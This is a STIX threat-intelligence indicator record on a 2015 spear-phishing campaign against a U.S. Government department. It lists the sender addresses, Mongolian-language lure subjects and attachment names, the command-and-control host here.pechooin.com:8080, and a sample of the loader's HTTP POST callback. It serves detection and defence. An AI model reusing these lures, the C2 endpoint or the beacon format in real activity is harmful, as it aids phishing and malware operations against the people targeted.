stix:STIX_Header.stix:Title: Numerous Phishing Email Attachments Make Callbacks to Same Domain
stix:STIX_Header.stix:Description: Between 09 to 13 March 2015, three different phishing emails were sent to a U.S. Government Department as part of a campaign. Other than the name and size no details were available for the file attachments. The malware loader from each of the malicious attachments communicated with here.pechooin.com:8080.

stix:Indicator.indicator:Description: ---- BEGIN EMAIL 1 ---- Sender: m.monhbat@aol.com Date: Mon, 9 Mar 2015 22:06:24 GMT 2015 Subject: Hun michnees uuseegui Attachment: Hun michnees uuseegui.doc (2055437 bytes) ---- END EMAIL 1 ----

---- BEGIN EMAIL 2 ---- Sender: tavan_tolgoi@aol.com Date: Thu Mar 12 12:44:14 GMT 2015 Subject: Tavantolgoin Medee No1 (20150305) Attachment: Tavantolgoin Medee No1 (20150305).doc (122414 bytes) ---- END EMAIL 2 ----
---- BEGIN EMAIL 3 ---- Sender: enkhbatar@aol.com Date: Fri Mar 13 08:29:00 GMT 2015 Subject: Tsag agaariin medee Attachment: Tsag agaariin medee.doc (76846 bytes) ---- END EMAIL 3 ----

The following is a sample of the HTTP POST request that is associated with the loader for all three spear-phishing emails:
POST /cgl-bin/update.cgi HTTP/1.1 Host: here.pechooin.com:8080 Content-Length: 25 Cache-Control: no-cache
